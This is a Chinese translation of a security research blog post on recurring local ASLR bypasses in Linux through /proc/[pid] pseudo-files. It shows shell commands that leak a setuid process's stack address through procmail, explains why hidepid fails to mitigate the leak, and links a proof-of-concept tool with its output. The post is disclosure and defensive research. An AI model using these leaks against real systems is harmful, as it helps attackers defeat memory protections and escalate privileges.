
# 层出不穷的Linux本地ASLR漏洞


                                阅读量   
                                **768497**
                            
                        |
                        
                                                                                                                                    ![](./img/198799/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者blazeinfosec，文章来源：blog.blazeinfosec.com
                                <br>原文地址：[https://blog.blazeinfosec.com/the-never-ending-problems-of-local-aslr-holes-in-linux/](https://blog.blazeinfosec.com/the-never-ending-problems-of-local-aslr-holes-in-linux/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/198799/t01da3bf2cab2f53444.png)](./img/198799/t01da3bf2cab2f53444.png)



## 0x00 绪论

地址空间布局随机化（ASLR）是一种概率性安全防御机制，2001年由PaX Team提出并实现，2005年进入Linux上游内核（2.6.12）。ASLR顾名思义就是每次运行可执行文件时随机安排其地址空间，具体做法是对映射的基地址进行随机化。有一类内存破坏漏洞需要知道内存地址才能利用，而ASLR的目的在于使这类漏洞无法利用。

过去，内存破坏漏洞需要得知并硬编码内存地址，以返回到可执行文件中现成的指令或者通过漏洞写入的指令，来实现任意代码执行或者篡改关键的程序数据。ASLR设计的初衷是抵御远程攻击者，因为对远程攻击者来说，事先掌握的关于内存地址的信息极少。



## 0x01 回顾

对本地攻击者来说，`/proc/[pid]/`一直是问题多多，成了通用信息泄露的主要来源，泄露这些信息可以绕过setuid二进制或一般的root进程的ASLR。2009年，当时Google安全团队的Tavis Ormandy和Julien Tinnes参加CanSecWest安全会议，会上进行了主题为《Linux ASLR的奇妙细节》（Linux ASLR Curiosities，[https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf](https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf) ）的简短展示，演示`/proc/[pid]/stat`和`/proc/[pid]/wchan`信息泄露，包括泄露进程指令指针（IP）和栈指针（SP）。如果某进程无法ptrace()附加，这些信息可用于还原进程的地址空间布局。随后，问题据认为是修复了（ [https://lkml.org/lkml/2009/5/4/322](https://lkml.org/lkml/2009/5/4/322) ）。

十年后的2019年4月3日，一个适用于4.8以下的Linux内核的漏洞利用公开发表（ [https://www.openwall.com/lists/oss-security/2019/04/03/4/1](https://www.openwall.com/lists/oss-security/2019/04/03/4/1) ），该漏洞再次利用了`/proc/[pid]/stat`来获取前述的setuid的IP和SP。由于`load_elf_binary()`（位于`fs/binfmt_elf.c`）调用`install_exec_creds()`的时机太迟，可执行文件已经被映射到地址空间，然后才设置访问凭据（credentials），因此攻击者可以趁中间的空当通过`ptrace_may_access()`检查，而这个检查正是为了修复Tavis和Julien提出的攻击而引入的。攻击者只要在`install_exec_creds()`调用前使用`read()`读取`/proc/[pid]/stat`，就可利用此竞争条件漏洞。

2019年4月25日，CVE-2019-11190发现之后几天，SUSE Linux的安全工程师也在Openwall的oss-sec列表上发布了一个已知且据称“修复”了的问题，影响的内核版本小于3.18（ [https://www.openwall.com/lists/oss-security/2019/04/25/4](https://www.openwall.com/lists/oss-security/2019/04/25/4) ）。该漏洞是任意进程的通用本地ASLR绕过，成因是对`/proc/[pid]/maps`伪文件的权限检查时机不对，把在`open()`时进行的检查放在了`read()`时。`proc(5)`的man文档指出该文件包含当前映射的内存区域及其访问权限。

```
$ cat /proc/self/maps
00400000-0040c000 r-xp 00000000 08:04 3670122                            /bin/cat
0060b000-0060c000 r--p 0000b000 08:04 3670122                            /bin/cat
0060c000-0060d000 rw-p 0000c000 08:04 3670122                            /bin/cat
02496000-024b7000 rw-p 00000000 00:00 0                                  [heap]
7f508bd4b000-7f508beec000 r-xp 00000000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
7f508beec000-7f508c0ec000 ---p 001a1000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
7f508c0ec000-7f508c0f0000 r--p 001a1000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
7f508c0f0000-7f508c0f2000 rw-p 001a5000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
7f508c0f2000-7f508c0f6000 rw-p 00000000 00:00 0 
7f508c0f6000-7f508c117000 r-xp 00000000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
7f508c164000-7f508c2ed000 r--p 00000000 08:04 800126                     /usr/lib/locale/locale-archive
7f508c2ed000-7f508c2f0000 rw-p 00000000 00:00 0 
7f508c2f2000-7f508c316000 rw-p 00000000 00:00 0 
7f508c316000-7f508c317000 r--p 00020000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
7f508c317000-7f508c318000 rw-p 00021000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
7f508c318000-7f508c319000 rw-p 00000000 00:00 0 
7ffcf3496000-7ffcf34b7000 rw-p 00000000 00:00 0                          [stack]
7ffcf351b000-7ffcf351e000 r--p 00000000 00:00 0                          [vvar]
7ffcf351e000-7ffcf351f000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

从2.6.22版开始，Linux内核只有在能`ptrace()`附加到某进程的情况下，才能读取`/proc/[pid]/maps`，非特权用户也就无法读取root进程的映射伪文件（否则ASLR将形同虚设）。

```
$ su &amp;
[1] 2661
$ cat /proc/2661/maps
cat: /proc/2661/maps: Permission denied
```

前述的Openwall发布的文章里指出，权限检查在`read()`时进行，这一点之所以有问题，是因为非特权用户可以打开映射文件，得到有效的文件描述符，然后将其传给特权程序（比如setuid root），而某些特权程序可以以某种方式将文件中的内容泄露给非特权用户（特权进程有权限`read()`读取映射文件）。

为了修复此漏洞，权限检查的时机从`read()`调整到了`open()`，代码在下面的commit中：<br>[https://github.com/torvalds/linux/commit/29a40ace841cba9b661711f042d1821cdc4ad47c](https://github.com/torvalds/linux/commit/29a40ace841cba9b661711f042d1821cdc4ad47c)



## 0x02 问题

SUSE的安全工程师忘记提到的是，这个“修复”是有问题的：还有别的`/proc/[pid]/`伪文件可以泄露当前映射的内存地址，而它们的权限检查还是在`read()`时进行的。其中之一是`/proc/[pid]/stat`（又是它），信息泄露的老源头。

```
$ su &amp;
[1] 2767
$ ls -l /proc/2767/stat
-r--r--r-- 1 root root 0 Feb  4 16:50 /proc/2767/stat

[1]+  Stopped                 su
$ cat /proc/2767/stat
2767 (su) T 2766 2767 2766 34817 2773 1077936128 266 0 1 0 0 0 0 0 20 0 1 0 181759 58273792 810 18446744073709551615 1 1 0 0 0 0 524288 6 0 0 0 0 17 1 0 0 6 0 0 0 0 0 0 0 0 0 0
```

这次情况和之前有所不同。非特权用户可以读取不能`ptrace()`附加的进程所属的`/proc/[pid]/stat`，但是内存地址都被填了0。Linux 5.5中的`fs/proc/array.c`摘录如下：

```
static int do_task_stat(struct seq_file *m, struct pid_namespace *ns,
            struct pid *pid, struct task_struct *task, int whole)
{

    [...]

    int permitted;

    [...]

    permitted = ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS | PTRACE_MODE_NOAUDIT);

    [...]

    seq_put_decimal_ull(m, " ", mm ? (permitted ? mm-&gt;start_code : 1) : 0);
    seq_put_decimal_ull(m, " ", mm ? (permitted ? mm-&gt;end_code : 1) : 0);
    seq_put_decimal_ull(m, " ", (permitted &amp;&amp; mm) ? mm-&gt;start_stack : 0);

    [...]
}
```

利用方式和SUSE安全工程师的Openwall文章中的一模一样，只是这次读的是`/proc/[pid]/stat`。另外一些可以泄露地址的setuid二进制包括`procmail`、`spice-client-glib-usb-acl-helper`和`setuid root`。

下面就用`procmail`做个例子：

```
$ su &amp;
[1] 3122
$ cut -d' ' -f51 /proc/3122/stat
0

[1]+  Stopped                 su
$ procmail &lt; /proc/3122/stat
$ tail -2 /var/spool/mail/user | cut -d' ' -f51
140726221803504

$ printf '0x%xn' 140726221803504
0x7ffd60760ff0

# cat /proc/3122/maps
[...]
7ffd60740000-7ffd60761000 rw-p 00000000 00:00 0                          [stack]
```

我们和零日漏洞项目（ZDI）进行了接触，向他们披露了该漏洞，Linux内核开发者对此回复，他们发现已经实现了一个可选配置，可以避免此漏洞，因此目前不会再修补漏洞。所提到的这个配置是`hidepid mount(8)`参数。

然而，这个参数并不能避免问题。

我们再次援引`proc(5)`的man文档：

> <p>hidepid=n (自Linux 3.3起)<br>
该选项控制谁能访问/proc/[pid]目录中的信息。参数n可取以下值之一：</p>
0 任何人可以访问任何/proc/[pid]目录。这是以前的默认行为，现在只要mount选项未指定，也是默认行为。
1 用户只能访问自己的/proc/[pid]目录下的文件和子目录（各/proc/[pid]目录本身仍然可见）。敏感文件（如/proc/[pid]/cmdline和/proc/[pid]/status）现在对其他用户不可访问。这样就无法得知某用户是否在运行某个特定程序（只要该程序不自己透露其存在）。
2 如模式1，加上其他用户的/proc/[pid]目录也不可见。这样/proc/[pid]目录就不能用于得知系统上所有的PID。不能隐藏某个特定PID进程的存在（可以以其他方式得知进程存在，比如”kill -0 $PID”），但可以隐藏进程的UID和GID，这二者在通常情况下可以通过对/proc/[pid]目录应用stat(2)得到。这样可大大增加攻击者收集当前运行进程信息的难度。

即使用`hidepid=2 mount`选项，攻击者仍然可以利用漏洞：用`open()`打开自己进程的`/proc/[pid]/stat`（或`/proc/[pid]/syscall`、`/proc/[pid]/auxv`），然后对想泄露其地址的`setuid`二进制用`execve()`。因为文件描述符在`setuid execve()`前就打开了（因为攻击者可以访问自己的伪文件），所以`hidepid mount`选项无法缓解此漏洞。攻击者现在就可以将文件描述符传给特权进程来泄露文件内容，进而泄露地址。



## 0x03 利用

我们在GitHub发布了PoC，命名为ASLREKT：[https://github.com/blazeinfosec/aslrekt](https://github.com/blazeinfosec/aslrekt)

下面是PoC演示，使用`spice-client-glib-usb-acl-helper`。

```
$ ./aslrekt
***** ASLREKT *****
Password: 
[+] /bin/su .text is at 0x564219868000
[+] /bin/su heap is at 0x56421b657000
[+] /bin/su stack is at 0x7ffe78d76000

# cat /proc/$(pidof su)/maps
564219868000-564219871000 r-xp 00000000 08:04 3674996                    /bin/su
[...]
56421b657000-56421b678000 rw-p 00000000 00:00 0                          [heap]
[...]
7ffe78d76000-7ffe78d97000 rw-p 00000000 00:00 0                          [stack]
```



## 0x04 总结

自从ASLR引入上游内核以来，本地ASLR攻击层出不穷，以后也不会停息。这不仅仅是`/proc/[pid]/`的缘故，还因为缺少暴力穷举攻击的检测机制，比如检测短时间内多次崩溃。Linux内核开发者似乎也对`/proc/[pid]/`文件潜在的问题和威胁缺乏认识，问题没有得到恰当修复，反而提出了一个没用的“临时解决方法”。另一方面，grsecurity提供了一个配置选项（`CONFIG_GRKERNSEC_PROC_MEMMAP`），开启后可以防止`/proc/[pid]/`文件的信息泄露。
